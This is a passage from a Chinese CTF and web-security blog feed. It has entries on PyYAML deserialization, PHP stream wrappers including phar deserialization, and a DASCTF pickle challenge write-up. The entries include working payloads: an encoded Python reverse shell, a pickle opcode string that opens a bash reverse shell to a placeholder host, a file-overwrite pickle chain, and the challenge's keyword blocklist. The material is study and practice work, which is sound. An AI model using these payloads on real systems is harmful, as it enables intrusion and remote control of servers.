class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>在url编码上传执行就可以</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!python/object/new:type</span><br><span class="hljs-attr">args:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">exp</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-type">!!python/tuple</span> []<br>  <span class="hljs-bullet">-</span> &#123;<span class="hljs-attr">&quot;extend&quot;:</span> <span class="hljs-type">!!python/name:exec</span> &#125;<br><span class="hljs-attr">listitems:</span> <span class="hljs-string">&quot;import urllib; exec(urllib.parse.unquote(&#x27;%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%73%79%73%74%65%6d%28%27%70%79%74%68%6f%6e%33%20%2d%63%20%5c%27%69%6d%70%6f%72%74%20%6f%73%2c%70%74%79%2c%73%6f%63%6b%65%74%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%69%70%22%2c%33%32%38%30%30%29%29%3b%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%29%66%6f%72%20%66%20%69%6e%28%30%2c%31%2c%32%29%5d%3b%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29%5c%27%27%29&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><p>学习大佬博客： </p><p><a href="https://www.tr0y.wang/s">https://www.tr0y.wang/s</a></p><p><a href="https://lisien11.xyz/">https://lisien11.xyz/</a></p>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PyYAML</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP伪协议</title>
    <link href="/tuyi/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/tuyi/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>介绍php常见的伪协议</p><h1 id="php-协议族"><a href="#php-协议族" class="headerlink" title="php:&#x2F;&#x2F; 协议族"></a>php:&#x2F;&#x2F; 协议族</h1><p>这些协议用于访问 PHP 的输入&#x2F;输出流、内存、临时文件等资源</p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><strong><code>php://input</code></strong></h2><p><strong>用途</strong>：读取原始的 HTTP 请求体数据（如 POST,GET 数据）</p><p><strong>实例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rawData</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><strong><code>php://filter</code></strong></h2><p><strong>用途</strong>：在读写文件时应用过滤器（如编码&#x2F;加密）。</p><p><strong>语法</strong>：<code>php://filter/&lt;过滤器链&gt;/resource=&lt;文件路径&gt;</code></p><p>官方文档：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">名称 描述<br><span class="hljs-attribute">resource</span>=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。<br><span class="hljs-attribute">read</span>=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br><span class="hljs-attribute">write</span>=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br>&lt;；两个链的筛选列表&gt;        任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。<br></code></pre></td></tr></table></figure><h3 id="过滤器："><a href="#过滤器：" class="headerlink" title="过滤器："></a>过滤器：</h3><h3 id="转换过滤器："><a href="#转换过滤器：" class="headerlink" title="转换过滤器："></a>转换过滤器：</h3><h4 id="convert-base64-encode-和-convert-base64-decode"><a href="#convert-base64-encode-和-convert-base64-decode" class="headerlink" title="convert.base64-encode 和 convert.base64-decode"></a>convert.base64-encode 和 convert.base64-decode</h4><p>将读取的数据进行base64转换后输出</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=file.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="convert-quoted-printable-encode-和-convert-quoted-printable-decode"><a href="#convert-quoted-printable-encode-和-convert-quoted-printable-decode" class="headerlink" title="convert.quoted-printable-encode 和 convert.quoted-printable-decode"></a>convert.quoted-printable-encode 和 convert.quoted-printable-decode</h4><p>将非ascii码的值转换为转换为 <code>=XX</code> 格式的 ASCII 字符串，其中 <code>XX</code> 是该字符的十六进制值。</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;Hello, 世界! =&quot;</span>;<br><span class="hljs-variable">$encoded</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/write=convert.quoted-printable-encode/resource=data://text/plain,&#x27;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$text</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$encoded</span>;<br><span class="hljs-comment">//Hello,=20=E4=B8=96=E7=95=8C!=20=3D 中文被转换</span><br></code></pre></td></tr></table></figure><h4 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h4><blockquote><p>依赖 <code>iconv</code> 扩展，需确保 PHP 已启用该扩展</p></blockquote><p><code>convert.iconv.*</code> 是一个强大的流过滤器（Stream Filter），用于在不同字符编码之间进行转换</p><p><strong>过滤器格式</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">convert.iconv.&lt;输入编码&gt;.&lt;输出编码&gt;<br>或<br>convert.iconv.&lt;输出编码&gt;/&lt;输入编码&gt;<br></code></pre></td></tr></table></figure><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//将 UTF-8 字符串写入为 GBK 文件</span><br><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;你好，世界！&quot;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<br>    <span class="hljs-string">&#x27;php://filter/write=convert.iconv.utf-8.gbk/resource=output.txt&#x27;</span>,<br>    <span class="hljs-variable">$text</span><br>);<br></code></pre></td></tr></table></figure><h3 id="链式过滤器"><a href="#链式过滤器" class="headerlink" title="链式过滤器"></a><strong>链式过滤器</strong></h3><p>不同的过滤器可以用管道符连接做一个链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 先解码 Base64，再转换编码（假设原始数据是 GBK 编码的 Base64）</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<br>    <span class="hljs-string">&#x27;php://filter/read=convert.base64-decode|convert.iconv.gbk.utf-8/resource=data.txt&#x27;</span><br>);<br></code></pre></td></tr></table></figure><h1 id="zip"><a href="#zip" class="headerlink" title="zip://"></a><strong><code>zip://</code></strong></h1><p><strong>用途</strong>：读取 ZIP 压缩包中的文件。</p><p><strong>语法</strong>：<code>zip://&lt;压缩包路径&gt;#&lt;内部文件&gt;</code>。</p><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;zip://archive.zip#file.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="data"><a href="#data" class="headerlink" title="data://"></a><strong><code>data://</code></strong></h1><p><strong>介绍</strong>：数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p><p>allow_url_fopen和allow_url_include都需要开启。</p><p><strong>语法</strong>：<code>data:[&lt;MIME类型&gt;][;base64],&lt;数据&gt;</code>。</p><ul><li><strong>MIME 类型</strong>（可选）：指定数据的格式（如 <code>text/plain</code>, <code>image/png</code>），默认是 <code>text/plain</code>。</li><li><strong>base64</strong>（可选标记）：表示数据是 Base64 编码的。</li><li><strong>数据</strong>：原始内容或 Base64 编码后的内容。</li></ul><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SGVsbG8=&#x27;</span>); <span class="hljs-comment">// 输出 &quot;Hello&quot;</span><br></code></pre></td></tr></table></figure><h1 id="phar"><a href="#phar" class="headerlink" title="phar://"></a><strong><code>phar://</code></strong></h1><p><strong>用途</strong>：访问 PHAR（PHP 归档）文件中的内容。</p><p><strong>语法</strong>：<code>phar://&lt;路径&gt;/file.phar/&lt;内部文件&gt;</code>。</p><p><strong>用法</strong>：在反序列化可以用</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/fb3befe87ee638410501d54bc543c8f3.png" alt="来自CSDN块块"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 创建并配置 PHAR</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br> <br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar&#x27;</span>;      <span class="hljs-comment">#phar协议，phar.phar包，</span><br>  <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>);     <span class="hljs-comment">#受影响的file_exists函数 触发反序列化</span><br></code></pre></td></tr></table></figure><h1 id="glob"><a href="#glob" class="headerlink" title="glob://"></a><strong><code>glob://</code></strong></h1><p><strong>用途</strong>：匹配文件路径模式（如遍历目录）。一般配合原生类使用</p><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&#x27;glob:///path/*.txt&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123; ... &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.23</title>
    <link href="/tuyi/2025/01/23/2025-1-23/"/>
    <url>/tuyi/2025/01/23/2025-1-23/</url>
    
    <content type="html"><![CDATA[<h1 id="2024-DASCTF-const-python"><a href="#2024-DASCTF-const-python" class="headerlink" title="2024 DASCTF const_python"></a>2024 DASCTF const_python</h1><p>提示访问&#x2F;src拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request,jsonify,session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.username = username<br>        <span class="hljs-variable language_">self</span>.password = password<br>        <span class="hljs-variable language_">self</span>.auth = auth<br><br>password = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>Admin = User(<span class="hljs-string">&#x27;admin&#x27;</span>, password,<span class="hljs-string">&quot;admin&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to my application&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><br><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span> :<br>            <span class="hljs-keyword">if</span> password == admin.password:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&quot;admin&quot;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid Credentials&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">        &lt;!-- /src may help you&gt;</span><br><span class="hljs-string">            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppicklee&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppicklee</span>():<br>    data = request.form[<span class="hljs-string">&#x27;data&#x27;</span>]<br><br>    sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    <span class="hljs-keyword">try</span>:<br><br>        pickle_data = base64.b64decode(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;template&#x27;</span>, <span class="hljs-string">&#x27;render&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>,<br>                 <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;requests&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>,  <span class="hljs-string">&#x27;pickle&#x27;</span>,<span class="hljs-string">&quot;class&quot;</span>,<span class="hljs-string">&quot;mro&quot;</span>,<span class="hljs-string">&quot;flask&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;session&quot;</span>&#125;:<br>            <span class="hljs-keyword">if</span> i.encode() <span class="hljs-keyword">in</span> pickle_data:<br>                <span class="hljs-keyword">return</span> i+<span class="hljs-string">&quot; waf !!!!!!!&quot;</span><br><br>        pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success pickle&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail pickle&quot;</span><br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    username = session[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&#x27;You are not admin!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;buu.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>在ppicklee路由中存在<code>pickle.loads(pickle_data)</code>就存在pickle反序列化</p><p>过滤了很多命令执行函数，但是subprocess没有被过滤，这里可以利用</p><p>payload1反弹shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;csubprocess</span><br><span class="hljs-string">    run</span><br><span class="hljs-string">    p0</span><br><span class="hljs-string">    ((lp1</span><br><span class="hljs-string">    Vbash</span><br><span class="hljs-string">    p2</span><br><span class="hljs-string">    aV-c</span><br><span class="hljs-string">    p3</span><br><span class="hljs-string">    aVbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="hljs-string">    p4</span><br><span class="hljs-string">    atp5</span><br><span class="hljs-string">    Rp6.</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>解释</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs smali">csubprocess\nrun：<br><br>c：表示加载模块。<br>subprocess：导入 Python 标准库中的 subprocess 模块。<br>run：引用 subprocess.run 方法。<br>p0 到 p6：<br><br>p0, p1, p2 等是 pickle 的引用标识符，表示序列化对象的内部指针。<br>((lp1：<br><br>创建一个列表对象并开始填充数据。<br>Vbash\np2：序列化字符串 <span class="hljs-string">&quot;bash&quot;</span> 并保存到 p2。<br><br>V-c\np3：序列化字符串 <span class="hljs-string">&quot;-c&quot;</span> 并保存到 p3。<br><br>Vbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\np4：<br><br>序列化的反向 shell 命令，指向 /dev/tcp/ip/port。<br>bash -i：交互式启动 Bash。<br>&gt;&amp; /dev/tcp/ip/port：将标准输出和标准错误重定向到指定的 IP 和端口。<br>0&gt;&amp;1：将标准输入重定向。<br>atp5：<br><br>将上述序列化内容作为参数列表，最终存储到 p5。<br>Rp6.：<br><br>调用 subprocess.run 并执行该命令。<br></code></pre></td></tr></table></figure><p>payload2外带到app.py:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">getattr = <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>)<br><br><span class="hljs-keyword">open</span> = <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>)<br>flag=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br><span class="hljs-keyword">read</span>=getattr(flag, <span class="hljs-string">&#x27;read&#x27;</span>)<br>f=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;./app.py&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">write</span>=getattr(f, <span class="hljs-string">&#x27;write&#x27;</span>)<br>fff=<span class="hljs-keyword">read</span>()<br><span class="hljs-keyword">write</span>(fff)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>转化为opcode</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">b<span class="hljs-string">&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">0cbuiltins</span><br><span class="hljs-string">open</span><br><span class="hljs-string">p1</span><br><span class="hljs-string">0g1</span><br><span class="hljs-string">(S&#x27;</span>/flag<span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp2</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g2</span><br><span class="hljs-string">S&#x27;</span><span class="hljs-keyword">read</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp3</span><br><span class="hljs-string">0g1</span><br><span class="hljs-string">(S&#x27;</span>./app.py<span class="hljs-string">&#x27;</span><br><span class="hljs-string">S&#x27;</span>w<span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp4</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;</span>writ<span class="hljs-string">e&#x27;</span><br><span class="hljs-string">tRp5</span><br><span class="hljs-string">0g3</span><br><span class="hljs-string">(tRp6</span><br><span class="hljs-string">0g5</span><br><span class="hljs-string">(g6</span><br><span class="hljs-string">tR.&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>解释：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 